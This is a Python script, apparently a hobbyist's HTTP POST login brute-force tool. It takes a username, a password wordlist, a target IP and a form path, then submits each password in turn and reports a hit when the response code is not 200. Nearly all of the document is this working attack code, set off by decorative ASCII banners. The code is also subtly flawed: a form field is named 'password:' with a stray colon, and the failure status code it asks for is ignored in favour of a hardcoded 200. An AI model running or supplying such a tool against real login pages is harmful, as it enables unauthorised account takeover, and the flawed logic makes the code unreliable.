#!/usr/bin/python3
# Usage: python3 foxypostbf.py
# HTTP-POST-FORM Bruteforce Tool
# Version: 0.1
# Written By. Jessi
# Github: https://github.com/jessisec
# Twitter: @jessitakes

import os
import requests
import sys
import time

# Intro
print("""\

                                              /\                   ,'|
					  o--'O `.                /  /
                                           `--.   `-----------._,' ,'
     /                                         \              ,---'
    //\                                         ) )    _,--(  |
   (o\                                         /,^.---'     )/\\
    ) \	                                      ((   \\      ((  \\
   (___()                                      \)   \) -hh  \) (/""")
print("\n")
print("/****************************************************************************/")
print("Foxy HTTP POST Bruteforce Tool")
print("Version: 0.1")
print("Written By. Jessi | Github: https://github.com/jessisec | Twitter: @jessitakes")
print("/****************************************************************************/")
print("\n")
print("Loading...")
time.sleep(3)
os.system("clear")

# Setup
#userlist = input("Userlist (leave blank if using single username: ")
#if userlist == "":
username = input("Username: ")
passlist = input("Password List: ")
ip = input("Target IP: ")
path = input("Path To Post Form (i.e. /admin/login.php): ")
response = input("Failed Login Status Code (i.e. 200): ").encode()
#request = input("Request Body")
url = ("http://" + ip+ path+"")

# Wait
print("Getting things ready...")
time.sleep(3)
os.system("clear")
print("Fire!")
print("\n")
print("""\
                      /^._
        ,___,--~~~~--' /'~
        `~--~\ )___,)/'
            (/\\_  (/\\_""")
time.sleep(2)
os.system("clear")

# Bruteforce!
def brute(username,password):
    data = {'user_name':username,'password:':password}
    s = requests.Session()
    r = s.post(url,data=data)
    if r.status_code != 200:
        print("[+] Password Found: ",password)
        sys.exit()
    else:
        print("[-] Invalid Password: ",password)
        #os.system("clear")

# Wordlist
def main():
    words = [w.strip() for w in open(passlist, "rb").readlines()] # Parse
    for payload in words:
        brute(username,payload)

if __name__ == '__main__':
    main()
